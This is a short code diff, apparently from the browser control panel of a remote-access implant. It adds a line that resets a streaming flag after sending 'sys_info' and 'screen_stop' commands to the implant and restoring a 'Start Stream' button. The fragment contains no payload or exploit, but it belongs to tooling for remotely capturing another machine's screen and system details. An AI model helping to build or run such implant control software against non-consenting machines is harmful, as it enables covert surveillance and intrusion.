@@ -994,6 +994,7 @@
                 setTimeout(() => {
                     sendImplantCmd('sys_info');
                     sendImplantCmd('screen_stop');
+                    isStreaming = false;
                     const btnStream = document.getElementById('btn-stream');
                     if (btnStream) btnStream.innerHTML = '<i class="fa-solid fa-play" style="margin-right:6px"></i> Start Stream';
                     const lsImg = document.getElementById('live-screen-img');
